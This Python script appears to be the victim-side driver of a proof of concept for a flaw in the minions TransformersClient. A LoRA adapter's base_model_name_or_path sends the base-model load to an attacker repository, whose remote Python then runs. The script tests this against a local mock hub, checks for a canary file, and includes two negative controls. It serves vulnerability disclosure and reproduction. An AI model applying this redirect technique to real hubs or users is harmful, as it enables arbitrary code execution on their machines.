"""Victim-side driver for the HazyResearch/minions LoRA-adapter
base-model-redirect PoC.

Loads a LoRA adapter directory through the REAL pinned TransformersClient
exactly as a victim would (TransformersClient(model_name=<adapter path>)),
with a local mock hub standing in for huggingface.co.

usage: python run_repro.py adapter_attacker | adapter_dataonly | adapter_nofield
"""
import importlib.util
import json
import os
import sys
import types

HERE = os.path.dirname(os.path.abspath(__file__))
SRC = os.path.join(HERE, "minions-a87d0ee90634")
WORK = os.path.join(HERE, "work")
SRC_FILE = os.path.join(SRC, "minions", "clients", "transformers.py")
SRC_SHA256 = "1bbb0743eead1f227713d6351be5ffbbbfebd98a9b78a5e84a7b3b0bee405373"

CANARY = os.path.join(HERE, "pwned_by_minions_adapter.txt")
ATTACKER_REPO = "attacker/minions-base-with-program"
DATAONLY_REPO = "victim/minions-base-data-only"

CASE = sys.argv[1] if len(sys.argv) > 1 else "adapter_attacker"
ADAPTER = os.path.join(WORK, CASE)
REQLOG = os.path.join(WORK, "hub_requests_%s.log" % CASE)

import hashlib  # noqa: E402

with open(SRC_FILE, "rb") as f:
    got = hashlib.sha256(f.read()).hexdigest()
if got != SRC_SHA256:
    print("[victim] FATAL: pinned transformers.py sha256 mismatch (%s)" % got)
    sys.exit(2)

os.environ["HF_HOME"] = os.path.join(WORK, "hf-home-" + CASE)
os.environ["HF_ENDPOINT"] = "http://127.0.0.1:8765"
os.environ["HF_HUB_DISABLE_TELEMETRY"] = "1"
os.environ["HF_HUB_DISABLE_SYMLINKS_WARNING"] = "1"

sys.path.insert(0, SRC)

import mock_hub  # noqa: E402

for d in (os.environ["HF_HOME"],):
    if os.path.exists(d):
        import shutil
        shutil.rmtree(d)
if os.path.exists(CANARY):
    os.remove(CANARY)
if os.path.exists(REQLOG):
    os.remove(REQLOG)
mock_hub.start_server(port=8765, hub_root=WORK + "/hub", request_log=REQLOG, quiet=True)
print("[victim] mock hub on 127.0.0.1:8765 serving work/hub")

# The client module is the untouched pinned file; minions' package __init__
# (minions/clients/__init__.py) only fan-outs imports of ~30 unrelated provider
# SDKs, so the module is loaded through a fabricated parent package that skips
# that __init__ while keeping the vulnerable file byte-for-byte pinned.
import minions.usage  # noqa: E402,F401  (minions/__init__.py is empty)

clients_pkg = types.ModuleType("minions.clients")
clients_pkg.__path__ = [os.path.join(SRC, "minions", "clients")]
sys.modules["minions.clients"] = clients_pkg
spec = importlib.util.spec_from_file_location("minions.clients.transformers", SRC_FILE)
mod = importlib.util.module_from_spec(spec)
sys.modules["minions.clients.transformers"] = mod
spec.loader.exec_module(mod)
TransformersClient = mod.TransformersClient

with open(os.path.join(ADAPTER, "adapter_config.json"), encoding="utf-8") as f:
    adapter_cfg = json.load(f)
print("[victim] adapter        : %s" % ADAPTER)
print("[victim] base_model_name_or_path : %r" %
      adapter_cfg.get("base_model_name_or_path", "<key absent>"))

drive, rest = os.path.splitdrive(ADAPTER)
MODEL_PATH = "/" + rest.lstrip("\\/").replace("\\", "/")
if not os.path.exists(MODEL_PATH):
    print("[victim] FATAL: %s does not resolve from cwd %s" % (MODEL_PATH, os.getcwd()))
    sys.exit(2)
print("[victim] model_name passed to TransformersClient: %r" % MODEL_PATH)
print("[victim]   (client enters the LoRA branch only for '/'-prefixed paths;")
print("[victim]    on POSIX the ordinary absolute adapter path does this;")
print("[victim]    on Windows it is a drive-relative path, cwd is on %s:)" % drive)

print("[victim] canary before  : exists=%s" % os.path.exists(CANARY))
print("[victim] constructing TransformersClient -> triggers _build_model_and_tokenizer()")
print("-" * 76)
try:
    client = TransformersClient(model_name=MODEL_PATH)
    status = "load : SUCCESS (%s)" % type(client.model).__name__
except Exception as e:  # noqa: BLE001 - the driver must survive all three cases
    if os.environ.get("MINIONS_POC_TRACEBACK"):
        import traceback
        traceback.print_exc()
    status = "load : FAILED (%s: %s)" % (type(e).__name__, str(e).splitlines()[-1][:110])
print("-" * 76)
print("[victim] %s" % status)
print("[victim] canary after   : exists=%s" % os.path.exists(CANARY))
if os.path.exists(CANARY):
    with open(CANARY, encoding="utf-8") as f:
        for line in f.read().splitlines():
            print("[victim]   CANARY> %s" % line)

lines = open(REQLOG, encoding="utf-8").read().splitlines() if os.path.exists(REQLOG) else []
gets = sorted(set(l for l in lines if l.startswith("GET ")))
print("[victim] repositories contacted (mock-hub request log):")
for l in gets:
    print("[victim]   %s" % l)

hit_attacker = any(l.startswith("GET  %s/" % ATTACKER_REPO) for l in gets)
hit_dataonly = any(l.startswith("GET  %s/" % DATAONLY_REPO) for l in gets)
got_py = any(".py" in l for l in gets)
executed = os.path.exists(CANARY)

print("[victim] attacker-repo .py fetched: %s, attacker code executed: %s" % (got_py, executed))
if CASE == "adapter_attacker":
    ok = hit_attacker and got_py and executed and not hit_dataonly
    print("[victim] RESULT: %s" % (
        "ARBITRARY CODE EXECUTION CONFIRMED - the adapter's base_model_name_or_path "
        "redirected the base-model load to the attacker repository, whose remote "
        "Python was downloaded AND imported/executed on this machine"
        if ok else "UNEXPECTED PATTERN (see log above)"))
elif CASE == "adapter_dataonly":
    ok = hit_dataonly and not executed and not got_py
    print("[victim] RESULT: %s" % (
        "NEGATIVE CONTROL AS EXPECTED - data-only second repo: files fetched, "
        "no remote code downloaded or executed"
        if ok else "UNEXPECTED PATTERN (see log above)"))
else:
    ok = not gets and not executed
    print("[victim] RESULT: %s" % (
        "MISSING-FIELD CONTROL AS EXPECTED - without base_model_name_or_path no "
        "second repository is contacted at all"
        if ok else "UNEXPECTED PATTERN (see log above)"))
sys.exit(0 if ok else 1)
